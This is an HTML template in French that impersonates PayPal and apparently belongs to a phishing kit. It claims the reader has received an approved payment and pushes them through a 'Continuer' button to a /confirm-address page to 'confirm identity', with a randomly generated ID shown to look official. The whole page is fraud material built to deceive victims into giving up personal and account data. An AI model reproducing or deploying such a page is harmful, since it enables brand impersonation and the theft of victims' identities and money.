<!DOCTYPE html>
<html dir="ltr">

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Sécurité</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge">

        <link rel="stylesheet" href="/css/normalize.css">
        <link rel="stylesheet" href="/css/bootstrap.min.css">
        <link rel="stylesheet" href="/css/font-awesome.min.css">
        <link rel="stylesheet" href="/css/main_style.css">
    </head>

    <body>
        <div class="contain">
            <div class="img-logo">
                <a href="#"><img src="/images/paypal-logo.png"
                        style="height: 160px;margin-top: -60px;margin-bottom: -75px;"></a>
            </div>
            <div class="center-color"></div>
            <div class="right-btn"><a href="#" class="log_out">Déconnexion</a></div>
            <div class="cls"></div>
        </div>
        <div class="contain">
            <div class="contain-info">
                <p class="hd">Vous avez reçu de l'argent aujourd'hui</p>
                <p class="hd">ID : <span id="userkey"></span></p>
                <div class="contain-lists">

                    <b class="bold">
                        <h5>Le {{ date("d/m/Y") }}, Ce Paiement de paypal a été deduit du compte de l'acheteur et a été
                            "APPROUVE" par sa banque.</h5>
                        <h5>

                            <br>

                            <p>Pour approuver la transaction suivez utilisez le bouton-ci dessous et suivez les
                                instructions.</p>
                            <br>
                            <p>Pour lutter contre les transactions frauduleuse, une confirmation d'identité peut etre
                                requise.</p> <br>
                            <p><strong>Voici les étapes à suivre:</strong></p>
                            <p>1.Cliquez sur continuer pour commencer</p>
                            <p>2.Confirmez votre identité</p>
                            <p>3.Recevez votre paiement sur votre compte</p>
                            <center>
                                <a href="{{ url('/confirm-address') }}" class="proccess">Continuer</a>
                            </center>

                        </h5>
                    </b>
                </div><b class="bold">
                </b>
            </div><b class="bold">
                <div class="foot-pay">
                    <center>
                        <a href="#">Aide et Contact</a>
                        <a href="#">Confidentialité</a>
                        <a href="#">Légal</a>
                        <a href="#">Sécurité</a>
                    </center>
                </div>
            </b>
        </div>
        <script src="/js/jquery-3.3.1.min.js"></script>
        <script>
        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }
        if (!sessionStorage.getItem("userkey")) {
            sessionStorage.setItem("userkey", makeid(16));
        }
        $('#userkey').html(sessionStorage.getItem("userkey"))
        </script>
    </body>

</html>
